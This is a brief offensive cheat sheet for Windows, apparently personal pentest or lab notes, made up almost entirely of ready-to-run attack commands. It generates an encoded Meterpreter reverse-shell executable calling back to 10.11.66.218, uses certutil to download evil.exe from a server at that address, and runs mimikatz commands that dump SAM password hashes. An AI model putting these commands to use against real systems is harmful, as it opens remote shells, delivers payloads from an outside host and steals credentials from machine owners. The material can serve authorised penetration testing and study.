# Windows Cheat Sheet

- [Windows Cheat Sheet](#windows-cheat-sheet)
  - [Generate a revshell](#generate-a-revshell)
  - [Upload a file](#upload-a-file)
  - [MIMIKATZ](#mimikatz)
    - [Commands](#commands)

## Generate a revshell
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.66.218 LPORT=1234 -f exe -o exp.exe
```

## Upload a file
```bash
certutil.exe -urlcache -split -f http://10.11.66.218:9999/evil.exe C:\\Temp\\evil.exe
```

## MIMIKATZ
Upload `mimikatz`

### Commands
```
privilege::debug
lsadump::sam
```